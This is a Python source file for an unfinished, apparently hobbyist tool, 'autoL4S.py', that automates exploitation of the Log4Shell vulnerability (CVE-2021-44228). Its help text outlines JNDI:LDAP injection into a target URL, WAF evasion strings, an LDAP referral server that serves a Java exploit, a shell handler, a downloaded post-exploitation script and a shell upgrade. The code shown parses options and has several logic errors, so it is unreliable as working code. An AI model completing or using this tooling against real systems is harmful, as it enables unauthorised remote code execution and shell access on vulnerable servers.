import os, sys, getopt, httplib2
prg_version = "0.1 Alpha"
                                                                            ###################################
                                                                           ######## WORK IN PROGRESS ########### 
                                                                            ###################################
# INSTALLATION PROC
# --configure (installing useful thirdy parts programs)
# --version (print version)
# --update (update the program)

# CREARE REQUIREMENTS.TXT --> httplib2

# USAGE
# --help
# -p (payload string) (Skip if -we/-wce were using)
# --waf-evasion (automate evade WAF (LOUDER)) 
# --waf-custom-evasion (User custom evasion string)
# -u (http://vuln_url?param=...) "... = "
# --ref-server <IP:PORT/exploit_name> (LDAP Referential Server (Where I download the exploit))
# -h <IP:PORT> (handler: Format IP:PORT)
# --post-shell <http://IP/post_script> (After connecting downloading 'post_script' from 'IP')
# --optimize (Trying to optimize the shell (from raw shell to /bin/bash))

def art():
    print('''

    AutoL4S.py --> Automatically testing Log4Shell vulnerability (CVE-2021-44228)
    #####################
    # Author: Nemesi    #
    # Country: IT       #
    # Love: Pizza       #
    # Git: @nemesi-ita  #
    #####################

    You can modify and steal everything in this program bc it's FREE!
    Special thanks to tryhackme.com for the idea!


                 uuuuuuu
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$"   "$$$"   "$$$$$$u
       "$$$$"      u$u       $$$$"
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         "$$$$uu$$$   $$$uu$$$$"
          "$$$$$$$"   "$$$$$$$"
            u$$$$$$$u$$$$$$$u
             u$"$"$"$"$"$"$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
 """      ""$$$$$$$$$$$uu ""$"""
           uuuu ""$$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
  $$$$$$$$$$""""           ""$$$$$$$$$$$"
   "$$$$$"                      ""$$$$""
     $$$"                         $$$$"
''')

def usage():
    art()
    print('''

SINTAX: 
python3 autoL4S.py -u ["http://vuln_url?param="] [-d | --waf-evasion | waf-custom-evasion "CUSTOM PAYLOAD"]
                                              --ref-server "IP:PORT:exploit_name"  
                                              [--optimize] 
                                              [--post-shell "ftp:// | http://IP:PORT/post_script"]

REMEMBER TO CHANGE THE IP/PORT IN THE DEFAULT EXPLOIT FILE (exploit.java) IF YOU DECIDE TO USE THIS ONE


                INSTALLATION
 --configure (installing useful thirdy parts programs)
 --version (print version)
 --update (check and update autoL4S.py and thirdy parts programs)

 SINTAX:
 python3 autoL4S.py [--configure | --update] [--version]

                    USAGE

 --help
 
 -d | --default                             Use default attack vector (JNDI:LDAP)
                                            Omit if --waf-evasion or --waf-custom-evasion being used                            

 --waf-evasion                              automate evade WAF (LOUDER) 
 
 --waf-custom-evasion <"CUSTOM PAYLOAD">    User custom evasion string
                                            Execute "autoL4S.py --more evasions" to find the custom strings that suits you!
 
 -u (http://vuln_url?param=)                The vulnerable URL
                                            Execute "autoL4S.py --more detect" to execute a thirdy part program to identify the attack vector/s
 
 -r | --ref-server <IP:PORT:exploit_name> (LDAP Referential Server (Where I download the exploit))
    Change exploit_name to 'def' to using the default exploit
    !!!NOTE: exploit_name doesn't need .java/.jar extension!!!
 
 -ps | --post-script <"ftp://IP:PORT/post_script | http://IP:PORT/post_script"> (After connecting downloading 'post_script' from 'IP' using Wget)
 
 --optimize (Trying to optimize the shell (from raw shell to /bin/bash))

 Examples:
    Default Payload string
 - autoL4S.py -u "http://vuln_url?param=" -d 

''')

# Check for file existence on the remote server
def check_post(post_protocol, url):
    try:
        url = post_protocol + "://" + url
        f = url.split("/")
        conn = httplib2.HTTPConnection(url)
        conn.request("HEAD", f[1])
        code = conn.getresponse().status
        print(code)
        return code
    except code != 200:
        print("Can't get the file\n\nHttp code Debug: %i", code)

def main(argv):
    v_url = ''          # Vuln URL
    ref_IP = ''         # Referential Server IP
    ref_Port = 0        # Referential Server PORT
    exploit = ''        # The exploit taken from Ref. Server
    custom_ev = ''      # User's custom evasion payload
    # Post Script vars
    post_Proto = ''     # Protocol to use
    post_url = ''       # URL of Post Script
    # Flags
    waf_ev = False
    optimize = False    # Riga X per cambiare shell

    try:
        opts, args = getopt.getopt(argv,"h:d:r:we:wce:u:rs:ps:o", ["help", "default", "ref-server","waf-evasion", "waf-custom-evasion", "post-script", "optimize", "version", "more"])
    except getopt.GetoptError as err:
        usage()
        print(err)
        sys.exit(2)

    for opt, arg in opts:
        if opt == ('--help', "-h"):
            usage()
        elif opt in "-u":
            v_url = arg
        elif opt in ("-r", "--ref-server"):
            tmp = arg.split(":", 3)
            ref_IP = tmp[0]
            ref_Port = tmp[1]
            exploit = tmp[2]
        elif opt in "--optimize":
            optimize = True
        elif opt in ("-we", "--waf-evasion"):
            waf_ev = True
        elif opt in ("-wce", "--waf-custom-evasion"):
            custom_ev = arg
        elif opt in ("-ps", "--post-script"):
            tmp = arg.split("://", 1)
            if tmp[0] == 'ftp://' or tmp[0] == 'http://' or tmp[0] == 'https://':
                post_Proto = tmp[0]
                post_url = tmp[1]
                check_post(post_Proto, post_url)
            else:
                print("\nProtocol '%s' not supported\n\nProtocol supported are FTP and HTTP/S" % tmp[0])
                sys.exit(1)
        elif opt in "--version":
            print("autoL4S.py version: %s" % prg_version)
        elif opt in "--more":
            if arg == "evasions":
                os.system("cat more/evasion_strings.txt")
                sys.exit(0)
            elif arg == "detect":
                os.system("cd more/detect && cat README && ls")
                sys.exit(0)
            else:
                print("\n\nCan't find %s, file or directory doesn't exist." % arg)
                sys.exit(1)
if __name__ == "__main__":
    main(sys.argv[1:])
